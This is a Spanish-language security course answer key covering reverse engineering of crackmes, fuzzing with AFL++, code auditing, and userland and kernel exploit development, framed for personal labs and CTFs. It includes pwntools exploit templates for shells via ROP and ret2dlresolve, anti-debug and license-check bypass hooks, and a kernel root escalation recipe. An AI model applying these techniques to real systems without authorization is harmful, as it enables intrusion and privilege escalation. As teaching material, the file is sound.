1. `file crackme` (arquitectura, si es PIE/stripped), `checksec --file=crackme`, `strings -n 6 crackme` (prompts, formatos, cadenas candidatas a clave).
2. Estructura ELF: `readelf -h` (entry point), `readelf -S` (secciones), `readelf -s | head` (símbolos si no está stripped).
3. `objdump -d -M intel crackme | sed -n '/<main>:/,/ret/p'` y localiza llamadas de comparación (`call ...<strcmp>`, `<strncmp>`, o una comparación byte a byte propia).
4. Correlaciona: la cadena del prompt (`strings`) y la `call strcmp` cercana indican la rutina de validación.

Evidencia que cumple el criterio: señalas la función de comparación (p. ej. `strcmp`, o un bucle propio) con evidencia cruzada de `strings` (la cadena esperada), `objdump` (la `call`) y `readelf` (el símbolo, si existe).

### Claves de los ejercicios

1. **Program headers** describen segmentos de **carga** en runtime (qué mapear y con qué permisos); **section headers** describen secciones para **análisis/enlazado** (`.text`, `.data`, símbolos). Pueden faltar los section headers sin impedir la ejecución.
2. `readelf -h crackme` → campo `Entry point address`; en `objdump -d` localizas esa dirección (normalmente `_start`).
3. Una cadena como `"Wrong password"` o `"S3cr3t!"` sugiere el mensaje de fallo o la propia clave; su xref lleva a la lógica de validación.
4. Está stripped si `readelf -s` no muestra nombres de funciones de usuario (solo dinámicos) o `file` dice `stripped`. Un binario con símbolos muestra `main`, funciones propias, etc.
5. Imports Windows como `CreateFileA`, `RegOpenKeyEx`, `InternetOpenUrl` sugieren, respectivamente, acceso a ficheros, registro y red → indicio de comportamiento.
6. Metodología para 2 MB: triage (`file`/`strings`/`checksec`) → localizar `main`/entry y funciones interesantes por imports/strings → construir call graph desde los puntos de entrada de datos → profundizar solo en las rutas relevantes (no leer todo linealmente).

---

## Clase 131 — Ghidra para ingeniería inversa

### Solución del reto verificable

Objetivo: usando solo Ghidra, deducir la clave válida de un `crackme` y luego comprobarla ejecutándolo; documentar en comentarios cómo se llegó a ella.

Enfoque (lab propio):

1. `File → New Project`, importa el `crackme`, acepta el **auto-análisis**.
2. En el Symbol Tree abre `main`; usa el panel Decompiler (pseudo-C) junto al Listing.
3. Localiza la comparación de la clave; renombra variables (`local_28`→`input`, `uVar1`→`len`) con `L` para clarificar.
4. Sigue las xrefs de la cadena del prompt (Defined Strings → `Show References to`) para ubicar la función de validación.
5. Retipa el buffer de la clave esperada como `char[N]` para que el decompilador la muestre legible; deduce la clave del pseudo-C (comparación directa, transformación, o longitud).
6. Verifica ejecutando el `crackme` con la clave deducida.

Evidencia que cumple el criterio: el `crackme` acepta la clave deducida del pseudo-C, y los comentarios de Ghidra documentan el razonamiento (qué función compara, qué transformación aplica).

### Claves de los ejercicios

1. Renombrar/comentar `main` hasta que el pseudo-C exprese "leer input → transformar → comparar con X → éxito/fracaso" sin ambigüedad.
2. En el Data Type Manager crea una `struct` con los campos que el binario usa (por offsets observados) y aplícala a la variable puntero; el decompilado pasa a mostrar accesos `->campo`.
3. `Ctrl+Shift+F` (References to) sobre la función de validación lista todas sus llamadas.
4. GhidraScript en Python: recorre `currentProgram.getFunctionManager().getFunctions(True)` e imprime nombre/entry point (equivalente a "extraer imports" desde el External Symbols).
5. En una función donde el decompilador simplifique de más, el Listing muestra la instrucción real (flags, offsets exactos) que el pseudo-C omite.
6. `File → Export Program` (o exportar como C/anotaciones) genera el informe del análisis.

---

## Clase 132 — IDA Pro y radare2

### Solución del reto verificable

Objetivo: analizar un `crackme` con radare2 (sin GUI) y deducir la clave usando solo comandos de r2, documentando los comandos.

Enfoque (lab propio):

1. `r2 -A ./crackme` (ejecuta `aaa`).
2. `afl` (lista funciones) → `s main; pdf` (desensambla `main`).
3. `izz` (todas las strings) para ver el prompt y la clave candidata; `axt @ str.<clave>` para ver quién la referencia.
4. `VV @ main` (grafo interactivo) para identificar el bloque de "éxito" y la condición que lo alcanza.
5. Deduce la clave de la comparación (cadena literal, o transformación reversible) y verifícala ejecutando el binario.

Evidencia que cumple el criterio: obtienes la clave correcta trabajando solo en la consola de r2, y documentas la secuencia (`aaa`, `afl`, `pdf`, `izz`, `axt`, `VV`).

### Claves de los ejercicios

1. IDA (GUI): navegación visual, grafo y Hex-Rays de un vistazo. r2 (REPL): todo por teclado, muy scriptable, curva más dura pero control fino y automatizable.
2. `pdc` (o `pdg` con el plugin de decompilación) da un pseudo-C más pobre que Hex-Rays, pero suficiente para lógica sencilla; se compara la legibilidad.
3. En Cutter: menú contextual → Rename; en r2 puro: `afvn <nuevo> <viejo>` (variables) o `afn <nuevo> <dir>` (funciones).
4. r2pipe: `for f in r.cmdj("aflj"): ...` y `r.cmd("axt @ sym.imp.strcmp")` para listar llamadas a `strcmp`.
5. En `VV`, el bloque de éxito es el que sigue a la rama "clave correcta" (suele imprimir "Correcto"/dar la flag); se identifica por su string o su `call puts`.
6. `Ps <archivo>` guarda el proyecto de r2 (análisis, comentarios, renombrados) para retomarlo.

---

## Clase 133 — Análisis estático de binarios

### Solución del reto verificable

Objetivo: con capstone y pyelftools, script que liste todas las instrucciones `call` de `.text` con su dirección y, si es directa, la función destino; marcar las indirectas como "no resueltas".

Enfoque (lab propio):

```python
from capstone import *
from elftools.elf.elffile import ELFFile
f = ELFFile(open("crackme", "rb"))
text = f.get_section_by_name(".text")
code, base = text.data(), text["sh_addr"]
md = Cs(CS_ARCH_X86, CS_MODE_64); md.detail = True
for i in md.disasm(code, base):
    if i.mnemonic == "call":
        op = i.op_str
        if op.startswith("0x"):            # destino directo (relativo resuelto por capstone)
            print(f"0x{i.address:x}: call -> {op}")
        else:                               # call rax / call [rip+..] etc.
            print(f"0x{i.address:x}: call -> no resuelta ({op})")
```

Evidencia que cumple el criterio: las llamadas directas se imprimen con su destino (verificable contra `objdump -d crackme`), y las indirectas (`call rax`, `call qword [rip+...]`) se marcan como "no resuelta".

### Claves de los ejercicios

1. Un caso de desincronización: datos incrustados en `.text` (p. ej. una tabla de saltos) que el desensamblado **lineal** interpreta como opcodes, produciendo instrucciones "basura" hasta que se resincroniza.
2. CFG de una función con bucle+condición: bloque de entrada → bloque de condición (con dos aristas: cuerpo del bucle y salida) → el cuerpo vuelve a la condición (arista de retroceso) → bloque de salida.
3. Call graph parcial: nodo `main` con aristas a las funciones que llama (`scanf`, `validar`, `puts`), y `validar` a `strcmp`.
4. Con capstone: recorrer `.text` y contar `i.mnemonic == "call"`.
5. Packing: `upx -t` confirma UPX; si no, alta **entropía** (~7.9), pocas secciones e imports mínimos delatan empaquetado.
6. `jmp rax` (salto indirecto) complica el estático porque el destino depende de un valor de runtime; el desensamblado recursivo no puede seguirlo sin análisis de valores o ejecución.

---

## Clase 134 — Análisis dinámico y debugging de binarios

### Solución del reto verificable

Objetivo: deducir la clave de un `crackme` que descifra su comparación en runtime, usando análisis dinámico (ltrace, GDB o Frida).

Enfoque (lab propio / VM aislada):

1. `ltrace ./crackme`: si la comparación es un `strcmp` de librería, verás `strcmp("loQueEscribí", "CLAVE_REAL")` directamente → clave revelada.
2. Si está ofuscada/inlined, GDB con hook automático sobre `strcmp`:

   ```gdb
   break strcmp
   commands
     printf "cmp: %s vs %s\n", $rdi, $rsi
     continue
   end
   run
   ```

3. Alternativa Frida: `Interceptor.attach(Module.getExportByName(null,"strcmp"), {onEnter(a){console.log(a[0].readUtf8String(), a[1].readUtf8String());}})` con `frida -f ./crackme -l hook.js`.
4. La clave aparece como el **segundo** argumento (el valor esperado) en el momento de la comparación.

Evidencia que cumple el criterio: obtienes la clave correcta y explicas con qué herramienta/hook la capturaste justo en la comparación (p. ej. "ltrace mostró `strcmp(input,\"S3cr3t\")`").

### Claves de los ejercicios

1. `ltrace ./crackme` y leer el `strcmp(input, "CLAVE")` que aparece al introducir cualquier texto.
2. Script GDB con `break strcmp` + `commands ... printf ... continue ... end`: registra cada comparación sin detenerse (como en el reto).
3. Frida: en `onLeave(retval){ retval.replace(0); }` sobre la función de validación fuerza "clave correcta" sin conocerla.
4. `strace` traza **syscalls** (open/read/write/mmap): útil para I/O y comportamiento a nivel kernel. `ltrace` traza **llamadas a librería** (`strcmp`, `malloc`): más legible para la lógica.
5. Con Qiling emulas una función de descifrado aislada y comparas su salida con la ejecución real; coincidencia = emulación correcta.
6. `dump memory out.bin $addr $addr+64` tras la rutina de descifrado, luego `strings out.bin` para leer la cadena recuperada.

---

## Clase 135 — Ofuscación y técnicas anti-reversing

### Solución del reto verificable

Objetivo: tomar un `crackme` empacado con anti-debugging y analizarlo: desempacar, neutralizar el anti-debug y deducir la clave.

Enfoque (lab propio / VM aislada):

1. Detecta packing: `upx -t crackme.packed` y/o calcula entropía (~7.9 sugiere empaquetado/cifrado).
2. Desempaca: `upx -d crackme.packed -o crackme.unpacked` (si no es UPX, dump en runtime tras que el stub descomprima en memoria).
3. Neutraliza anti-debug: localiza el `ptrace(PTRACE_TRACEME)` en Ghidra y **parchea** el salto (invierte `je`↔`jne`) o intercepta `ptrace` con Frida devolviendo `0`.
4. Ya con debugger adjunto, sigue la validación (o usa angr para hallar la entrada que llega al estado "éxito") y deduce la clave.

Evidencia que cumple el criterio: logras adjuntar un debugger pese al anti-debug (por parcheo o Frida) y obtienes la clave válida del binario desempacado.

### Claves de los ejercicios

1. Un ELF normal tiene entropía ~4.5–6.5; uno empacado ~7.8–8.0. Se comparan con el script de entropía del lab.
2. Tras `upx -d`, `objdump -d crackme.unpacked` muestra muchas más funciones reales (antes solo se veía el stub descompresor).
3. Parcheo del chequeo `ptrace`: sustituir el `je`/`jne` posterior a la comparación de su retorno para que el flujo tome siempre la rama "sin debugger".
4. Frida hookea `ptrace` (`Interceptor.replace`) devolviendo `0` sin tocar el binario en disco.
5. angr: `sm.explore(find=..., avoid=...)` y `posix.dumps(0)` recupera la entrada; límite = **state explosion** en binarios con muchas ramas/bucles.
6. En control-flow flattening, el **dispatcher** es el gran `switch`/bloque central con una variable de estado que decide el siguiente bloque; se identifica por su bloque con muchas aristas de entrada/salida.

---

## Clase 136 — Fuzzing con AFL++ y libFuzzer

### Solución del reto verificable

Objetivo: encontrar y reproducir un crash en un objetivo instrumentado, minimizar el caso y explicar la causa raíz con el backtrace de ASan.

Enfoque (lab propio):

1. Compila con instrumentación + ASan: `afl-cc -fsanitize=address -o parser_afl parser.c`.
2. Corpus semilla mínimo: `mkdir in && printf 'FUabc' > in/seed` (supera el check `s[0]=='F' && s[1]=='U'`).
3. Lanza: `afl-fuzz -i in -o out -- ./parser_afl @@`. En minutos aparecen crashes en `out/default/crashes/`.
4. Reproduce/tría: `./parser_afl out/default/crashes/id:000000*` → ASan imprime `stack-buffer-overflow` (el `strcpy(b, s)` desborda `char b[16]`).
5. Minimiza: `afl-tmin -i <crash> -o crash_min -- ./parser_afl @@`.

Evidencia que cumple el criterio: entregas un input mínimo determinista (una cadena que empieza por `FU` y excede 16 bytes) y el reporte de ASan identificando `stack-buffer-overflow` en `parse`.

### Claves de los ejercicios

1. Un corpus semilla con entradas válidas variadas mejora la cobertura inicial (más rutas alcanzadas de entrada); se mide con el `map coverage`/`paths` del panel de AFL++.
2. Un diccionario con los magic bytes/tokens (`-x dict.txt`) permite superar checks de formato antes; sin él, el fuzzer tarda mucho más en adivinar el token.
3. Modo persistente (`__AFL_LOOP`) reduce el coste de `fork/exec` por ejecución → miles de ejecuciones/seg más que el modo por proceso.
4. Tres crashes son el "mismo bug" si su backtrace de ASan converge en la misma línea/causa; se deduplican por firma de stack (`casr`).
5. `afl-tmin` reduce el caso al mínimo que sigue provocando el crash: elimina bytes irrelevantes conservando el prefijo `FU` y la longitud que desborda.
6. Harness libFuzzer para una función de parsing: `LLVMFuzzerTestOneInput(const uint8_t*d, size_t n)` copia `d` a un buffer terminado en `\0` y llama a la función; compila con `-fsanitize=fuzzer,address`.

---

## Clase 137 — Descubrimiento de vulnerabilidades en código

### Solución del reto verificable

Objetivo: auditar un proyecto C pequeño, identificar una vulnerabilidad real, demostrarla con una PoC mínima y redactar el reporte de divulgación.

Enfoque (lab propio / open source con permiso):

1. Modela la superficie de ataque: lista funciones que reciben datos externos (`argv`, ficheros, red, IPC) y márcalas como **fuentes**.
2. SAST cruzado: `cppcheck --enable=all --inconclusive src/`, `scan-build make`, `semgrep --config p/c src/`.
3. Sigue una advertencia real (p. ej. `memcpy`/`strcpy` con tamaño controlado) desde la fuente del dato hasta el sumidero (taint manual), confirmando explotabilidad.
4. PoC mínima que dispara el bug (entrada que provoca el overflow/crash) con `archivo:línea` exacto.
5. Reporte: descripción, PoC, versiones afectadas, impacto, mitigación y plazo de divulgación (p. ej. 90 días coordinados).

Evidencia que cumple el criterio: entregas ubicación exacta (`archivo:línea`), una PoC que dispara el bug y un reporte con impacto, versiones y mitigación propuesta.

### Claves de los ejercicios

1. Diagrama de superficie: red → parser de protocolo → buffers/estructuras internas; marca la frontera de confianza en la entrada de red y los sumideros (`memcpy`, índices, `system`).
2. `sprintf(buf, "%s", user)` sin límite desborda `buf` si `user` es más largo; riesgo = stack/heap overflow. Mitigación: `snprintf` con tamaño.
3. cppcheck tiende a más falsos positivos de estilo; Semgrep detecta patrones sintácticos (reglas); comparar qué encuentra cada uno en el mismo código.
4. Regla Semgrep: `pattern: gets(...)` con `message`/`severity: ERROR` → marca todo uso de `gets`.
5. Tabla de 5 hallazgos con columnas bug/fuente/sumidero/explotabilidad(alta/media/baja)/impacto; prioriza los de fuente controlable y sumidero peligroso.
6. Cuerpo del reporte: resumen, componente y versión, pasos de reproducción + PoC, impacto (RCE/DoS/leak), mitigación sugerida y solicitud de plazo coordinado.

---

## Clase 138 — Desarrollo de exploits moderno

### Solución del reto verificable

Objetivo: exploit completo contra un binario de laboratorio con NX+ASLR (y PIE si te atreves) que obtenga shell filtrando la base de libc en runtime, con fiabilidad ≥ 8/10.

Enfoque (lab propio):

1. `checksec ./target` para conocer las mitigaciones.
2. Plantilla pwntools local/remoto:

   ```python
   from pwn import *
   exe = context.binary = ELF("./target"); libc = ELF("./libc.so.6")
   def conn(): return remote(args.HOST, int(args.PORT)) if args.REMOTE else process(exe.path)
   io = conn()
   ```

3. **Primitiva 1 (leak):** filtra una dirección de libc (GOT/stack) y calcula `libc.address = leak - libc.symbols["puts"]`.
4. **Primitiva 2 (control):** cadena ROP con la base ya conocida para `system("/bin/sh")` (o `one_gadget`), cuidando alineación de 16 bytes.
5. Si es PIE, filtra también la base del ejecutable (`exe.address = code_leak - offset`). Si no conoces la libc, `libc-database` o `ret2dlresolve`.
6. Robustece con bucle de reintentos, evitando badchars y estabilizando el entorno.

Evidencia que cumple el criterio: `./exploit.py` da shell interactiva de forma fiable (≥8/10 corridas) con ASLR activo, calculando la base dinámicamente desde el leak.

### Claves de los ejercicios

1. Plantilla con `def conn(): return remote(...) if args.REMOTE else process(...)` alterna local/remoto sin reescribir.
2. Con un leak de libc, `libc-database`: `./find <símbolo> <últimos nibbles>` → identifica versión → `./download` para offsets exactos.
3. Filtrado de canary: un leak previo (fmt string o lectura OOB) revela el canary; se reinserta intacto en el payload para pasar la comprobación del epílogo.
4. `one_gadget libc.so.6` da direcciones con constraints (p. ej. `[rsp+0x40]==NULL`); se elige una cuyas condiciones se cumplan en el punto del salto y se salta a `libc.address + og`.
5. `rop.ret2dlresolve(Ret2dlresolvePayload(exe, symbol="system", args=["/bin/sh"]))` fuerza al enlazador a resolver `system` sin leak de libc.
6. Bucle `for _ in range(20): try: ... except: continue` midiendo cuántas corridas dan shell = fiabilidad.

---

## Clase 139 — Kernel exploitation: introducción

### Solución del reto verificable

Objetivo: en tu VM con un módulo vulnerable propio, escalar a root mediante `commit_creds(prepare_kernel_cred(0))`, con KASLR desactivado en el primer intento; un `id` posterior muestra `uid=0(root)` y el sistema sigue estable.

Enfoque (VM/QEMU, snapshot previo):

1. Compila un módulo con un `copy_from_user` sin acotar (bug deliberado) que exponga un `ioctl`/`write` vulnerable; cárgalo con `insmod`.
2. Arranca QEMU con `-append "console=ttyS0 nokaslr"` para direcciones estables en el primer ejercicio.
3. Programa de user-space que abre el device y dispara el overflow, controlando el flujo de ejecución del kernel.
4. Payload de escalada: cadena que ejecuta `commit_creds(prepare_kernel_cred(0))` (RDI=0 → prepare_kernel_cred devuelve cred de root en RAX → pasarlo a `commit_creds`) y **retorna limpiamente** a user-space guardando/restaurando el estado (`swapgs`/`iretq` con CS/SS/RFLAGS/RSP/RIP correctos).
5. Tras el retorno, lanza una shell desde user-space y ejecuta `id`.

Evidencia que cumple el criterio: `id` en la VM muestra `uid=0(root)` y el sistema no entra en panic (retorno a user-space correcto). Con `nokaslr` las direcciones de `commit_creds`/`prepare_kernel_cred` se leen de `/proc/kallsyms` (o del `System.map`).

### Claves de los ejercicios

1. Cuatro fuentes de superficie: syscalls, `ioctl` de drivers, sistemas de ficheros/pseudo-FS (`/proc`, `/sys`), y subsistema de red (netlink, sockets).
2. SMEP marca la memoria de usuario como no ejecutable desde el kernel, rompiendo el ret2usr (saltar a shellcode en user-space); se evade con **kernel ROP** (gadgets del propio kernel) que no ejecutan páginas de usuario.
3. `prepare_kernel_cred(0)` crea una nueva estructura `cred` con privilegios de root; `commit_creds()` la instala en el proceso actual → el proceso pasa a `uid=0`.
4. Con `nokaslr`, las direcciones del kernel son fijas entre arranques; sin él (`kaslr`), la base cambia cada boot y hace falta un leak de una dirección de kernel para recalcularlas.
5. KPTI separa las tablas de páginas de user y kernel; al volver a user-space hay que pasar por un **trampolín KPTI** (`swapgs_restore_regs_and_return_to_usermode`) en vez de un `iretq` directo, o el retorno falla.
6. Un CVE reciente de driver Linux (p. ej. UAF en un subsistema de red o `nftables`) → clase de bug: use-after-free que permite reasignar un objeto con punteros de función controlados.

---

## Clase 140 — CTFs de pwn e ingeniería inversa

### Solución del reto verificable

Objetivo: resolver de principio a fin un reto de pwn con objetivo remoto (plataforma de práctica), obtener la flag y entregar exploit + writeup.

Enfoque (entorno autorizado por diseño):

1. **Triage:** `file chall && checksec ./chall && strings chall | head`; abre en Ghidra para localizar la función vulnerable.
2. Reproduce el bug localmente y determina la **primitiva** (overflow, format string, UAF…).
3. Plantilla pwntools local/remoto:

   ```python
   from pwn import *
   exe = context.binary = ELF("./chall")
   def conn(): return remote("chall.ctf.io", 1337) if args.REMOTE else process(exe.path)
   io = conn()
   # ... payload segun la primitiva ...
   io.sendline(payload); io.interactive()
   ```

4. Desarrolla local hasta shell/flag; lanza remoto con `python3 exploit.py REMOTE` usando la **misma libc** del reto.
5. Escribe el writeup (enunciado, análisis, primitiva, exploit, flag) y contrástalo con writeups públicos.

Evidencia que cumple el criterio: `exploit.py REMOTE` recupera la flag del servidor y el writeup explica bug, primitiva y cadena de explotación de forma reproducible.

### Claves de los ejercicios

1. Reto de Binary Exploitation de picoCTF: documenta triage → bug → primitiva → payload → flag (típicamente overflow a `win`/`system`).
2. Crackme de crackmes.one: análisis estático/dinámico → deducción del algoritmo → clave; el "writeup" es tu razonamiento paso a paso.
3. Ante un prompt, `io.sendlineafter(b"pregunta> ", payload)` sincroniza el envío con la salida esperada.
4. Identifica la libc por un leak con `libc-database` (`./find`), descárgala y ajusta offsets/`libc.address`.
5. ROP Emporium `ret2win`: overflow → dirección de `ret2win`/`win`. `split`: reunir `system` + cadena `/bin/cat flag.txt` presente en el binario mediante `pop rdi`.
6. De un writeup avanzado, resumir una técnica nueva (p. ej. House of Apple/FSOP, ret2dlresolve, o un tcache attack específico) y qué la hace aplicable.

---

> Fin de la Parte 5. Continúa con la [Parte 6 — Análisis de malware](../classes/parte-6-analisis-de-malware/141-introduccion-al-malware-tipos-y-taxonomia/README.md).
